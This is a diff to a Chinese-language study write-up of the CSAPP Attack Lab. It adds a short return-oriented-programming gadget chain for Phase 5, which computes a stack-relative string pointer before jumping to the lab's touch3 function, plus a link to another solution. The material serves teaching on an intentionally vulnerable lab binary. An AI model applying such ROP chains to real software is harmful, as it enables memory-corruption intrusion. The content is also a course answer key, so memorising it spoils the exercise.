@@ -40,6 +40,11 @@ df 1e 40 00 00 00 00 00 // move指令
 64 1c 40 00 00 00 00 00 // touch2地址
 ```
 
+```asm6502
+pop %rax
+
+```
+
 ## Phase5
 
 由于栈随机，所以考虑栈指针+偏移来获取指针
@@ -55,3 +60,20 @@ df 1e 40 00 00 00 00 00 // move指令
 最终思路参考这篇：
 
 [CSAPP Attack Lab详解 - Svicen - 博客园](https://www.cnblogs.com/SVicen/p/16838693.html#level-3-1)
+
+```py
+# 前0x28个字符填充0x00
+popq %rax
+bias = 0x20
+movl %eax,%edx
+movl %edx,%ecx
+movl %ecx,%esi             # rsi为0x20
+movq %rsp,%rax             # rax = rsp
+movq %rax,%rdi
+add_xy # 代替指令 lea (%rdi,%rsi,1),%rax
+movq %rax,%rdi
+# touch3地址
+# cookie
+00 00 00 00 00 00 00 00 00
+# 对齐
+```
